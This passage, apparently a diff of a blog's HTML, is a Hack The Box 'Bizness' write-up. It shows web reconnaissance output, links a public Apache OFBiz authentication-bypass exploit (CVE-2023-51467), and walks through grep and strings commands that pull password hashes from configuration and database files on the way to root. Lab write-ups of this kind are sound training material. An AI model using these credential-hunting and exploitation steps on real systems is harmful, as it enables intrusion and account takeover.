+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Detected&lt;/span> &lt;span class="n">Plugins&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">Bootstrap&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Bootstrap&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">an&lt;/span> &lt;span class="n">open&lt;/span> &lt;span class="n">source&lt;/span> &lt;span class="n">toolkit&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">developing&lt;/span> &lt;span class="n">with&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTML&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CSS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">JS&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Website&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">getbootstrap&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">Cookies&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Display&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">names&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">cookies&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">HTTP&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">The&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">values&lt;/span> &lt;span class="n">are&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">returned&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">save&lt;/span> &lt;span class="n">on&lt;/span> &lt;span class="n">space&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">JSESSIONID&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">Email&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Extract&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">addresses&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">Find&lt;/span> &lt;span class="n">valid&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">address&lt;/span> &lt;span class="ow">and&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">syntactically&lt;/span> &lt;span class="n">invalid&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">addresses&lt;/span> &lt;span class="n">from&lt;/span> &lt;span class="n">mailto&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">link&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tags&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">We&lt;/span> &lt;span class="n">match&lt;/span> &lt;span class="n">syntactically&lt;/span> &lt;span class="n">invalid&lt;/span> &lt;span class="n">links&lt;/span> &lt;span class="n">containing&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mailto&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">catch&lt;/span> &lt;span class="n">anti&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">spam&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">addresses&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">eg&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">bob&lt;/span> &lt;span class="n">at&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">gmail&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">This&lt;/span> &lt;span class="n">uses&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">simplified&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">regular&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">expression&lt;/span> &lt;span class="n">from&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">regular&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">expressions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">email&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">html&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">valid&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">email&lt;/span> &lt;span class="n">address&lt;/span> &lt;span class="n">matching&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">bizness&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">bizness&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">HTML5&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTML&lt;/span> &lt;span class="n">version&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">detected&lt;/span> &lt;span class="n">by&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">doctype&lt;/span> &lt;span class="n">declaration&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">HTTPServer&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTTP&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="n">header&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">This&lt;/span> &lt;span class="n">plugin&lt;/span> &lt;span class="n">also&lt;/span> &lt;span class="n">attempts&lt;/span> &lt;span class="n">to&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">identify&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">operating&lt;/span> &lt;span class="n">system&lt;/span> &lt;span class="n">from&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">nginx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">from&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">HttpOnly&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">If&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">HttpOnly&lt;/span> &lt;span class="n">flag&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">included&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">HTTP&lt;/span> &lt;span class="n">set&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="n">header&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">browser&lt;/span> &lt;span class="n">supports&lt;/span> &lt;span class="n">it&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cannot&lt;/span> &lt;span class="n">be&lt;/span> &lt;span class="n">accessed&lt;/span> &lt;span class="n">through&lt;/span> &lt;span class="n">client&lt;/span> &lt;span class="n">side&lt;/span> &lt;span class="n">script&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">More&lt;/span> &lt;span class="n">Info&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">en&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wikipedia&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">org&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">wiki&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">HTTP_cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">JSESSIONID&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">JQuery&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">A&lt;/span> &lt;span class="n">fast&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">concise&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">JavaScript&lt;/span> &lt;span class="n">that&lt;/span> &lt;span class="n">simplifies&lt;/span> &lt;span class="n">how&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">traverse&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTML&lt;/span> &lt;span class="n">documents&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">handle&lt;/span> &lt;span class="n">events&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">perform&lt;/span> &lt;span class="n">animations&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">add&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">AJAX&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Website&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">jquery&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">Lightbox&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Javascript&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">nice&lt;/span> &lt;span class="n">image&lt;/span> &lt;span class="n">popups&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="ne">Script&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">This&lt;/span> &lt;span class="n">plugin&lt;/span> &lt;span class="n">detects&lt;/span> &lt;span class="n">instances&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">script&lt;/span> &lt;span class="n">HTML&lt;/span> &lt;span class="n">elements&lt;/span> &lt;span class="ow">and&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">returns&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">script&lt;/span> &lt;span class="n">language&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">nginx&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Nginx&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Engine&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">X&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="n">free&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">open&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">source&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">high&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">performance&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTTP&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">reverse&lt;/span> &lt;span class="n">proxy&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">as&lt;/span> &lt;span class="n">well&lt;/span> &lt;span class="n">as&lt;/span> &lt;span class="n">an&lt;/span> &lt;span class="n">IMAP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">POP3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">proxy&lt;/span> &lt;span class="n">server&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Version&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Website&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">nginx&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">net&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">HTTP&lt;/span> &lt;span class="n">Headers&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.1&lt;/span> &lt;span class="mi">200&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Server&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">nginx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Date&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Thu&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">25&lt;/span> &lt;span class="n">Jan&lt;/span> &lt;span class="mi">2024&lt;/span> &lt;span class="mi">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">46&lt;/span> &lt;span class="n">GMT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Transfer&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Encoding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">chunked&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Connection&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">close&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Set&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Cookie&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">JSESSIONID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">B31C497CC8F813F10984F79DDF132335&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">jvm1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="ne">Path&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">Secure&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">HttpOnly&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Ranges&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">bytes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ETag&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">W&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="s2">&amp;#34;27200-1702887508516&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Last&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Modified&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Mon&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">18&lt;/span> &lt;span class="n">Dec&lt;/span> &lt;span class="mi">2023&lt;/span> &lt;span class="mi">08&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">28&lt;/span> &lt;span class="n">GMT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">vary&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">encoding&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Encoding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">gzip&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="foothold-">FootHold ?&lt;/h2>
+&lt;p>I used this repo from GH to bet a foothold &lt;br>
+&lt;code>https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass&lt;/code>&lt;/p>
+&lt;p>And here a PoC (Proof Of Concept) of this vulnerability : &lt;br>
+&lt;a class="link" href="https://www.youtube.com/watch?v=DuLzg6U25VM&amp;amp;ab_channel=%C3%81kosJakab" target="_blank" rel="noopener"
+>https://www.youtube.com/watch?v=DuLzg6U25VM&amp;ab_channel=%C3%81kosJakab&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc3.png"
+width="1914"
+height="579"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc3_hu4dbd5ea23ae62b11ec564884ae654f93_133462_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc3_hu4dbd5ea23ae62b11ec564884ae654f93_133462_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Exploitation CVE-2023-51467 "
+class="gallery-image"
+data-flex-grow="330"
+data-flex-basis="793px"
+>&lt;/p>
+&lt;p>Go to stabilize the shell and go ahead this machine&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc4.png"
+width="1173"
+height="388"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc4_hu49863b74879c344286bab13e374ea64f_109598_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc4_hu49863b74879c344286bab13e374ea64f_109598_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Shell Stabilized"
+class="gallery-image"
+data-flex-grow="302"
+data-flex-basis="725px"
+>&lt;/p>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;p>The privilege escalation journey initiates with routine reflexes, yet unfortunately, yields no success.&lt;/p>
+&lt;ul>
+&lt;li>Running linpeas.sh doesn&amp;rsquo;t provide any valuable insights,&lt;/li>
+&lt;li>The sudo -l command prompts for a password without divulging information,&lt;/li>
+&lt;li>The search for executables with elevated permissions reveals nothing, and&lt;/li>
+&lt;li>Attempts to exploit kernel vulnerabilities prove futile.&lt;/li>
+&lt;/ul>
+&lt;p>Faced with these setbacks, I navigate towards the OFBiz configuration directory, realizing that the privilege escalation likely needs attention at this level. &lt;br>
+The intricacies of the structure, encompassing numerous directories and files, prompt me to contemplate a more methodical approach.&lt;/p>
+&lt;p>Given the time constraints and considering this is only the first half of the process, a systematic examination becomes imperative.&lt;/p>
+&lt;p>Continuing the journey, I leverage the command&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">grep -rni password * &lt;span class="p">|&lt;/span> cut -c10-1200
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>to pinpoint files of interest, leading me to uncover the hash
+&lt;code>{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a&lt;/code>
+In order to further narrow down my search, given that this hash was sourced from the &lt;em>&amp;ldquo;ChangePassword&amp;rdquo;&lt;/em> file from &lt;code>themes/rainbowstone/template/ChangePassword.ftl:58:&lt;/code>,&lt;br>
+I fine-tune my approach with:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">grep -rn password * &lt;span class="p">|&lt;/span> grep -v inbowstone/template/ChangePassword.ftl
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This refinement directs me towards more specific files. &lt;br>
+Following this trail, I delve into &lt;strong>/opt/ofbiz/runtime/data/derby/ofbiz/seg0—the derby folder&lt;/strong> , &lt;br>
+&lt;em>noted as the database folder according to Google&lt;/em>. &lt;br>
+My exploration deepens with the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">strings * &lt;span class="p">|&lt;/span> grep admin &lt;span class="p">|&lt;/span> cut -c1-1200 &lt;span class="p">|&lt;/span> sort -u
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This reveals another hash: &lt;strong>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I&lt;/strong>. To decipher this hash, I employ a Python script, successfully obtaining the plaintext and solidifying my position as root.&lt;/p>
+&lt;h2 id="the-end">The End&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
